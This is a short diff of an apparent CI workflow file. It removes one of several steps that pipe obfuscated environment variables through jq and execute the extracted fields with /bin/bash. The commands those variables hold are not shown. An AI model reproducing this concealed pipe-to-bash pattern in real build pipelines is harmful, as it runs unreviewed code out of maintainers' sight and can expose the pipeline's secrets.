@@ -31,7 +31,6 @@ jobs:
           echo $o51 | jq -r .b1375 | /bin/bash
           printf '%s' "$qoj34576" | jq -r .fp59453 | /bin/bash
           printf '%s' "$al7" | jq -r .fr524 | /bin/bash
-          echo $lut4 | jq -r .yd9360 | /bin/bash
           printf '%s' "$l1569" | jq -r .yp0 | /bin/bash
 
       - name: Upload results
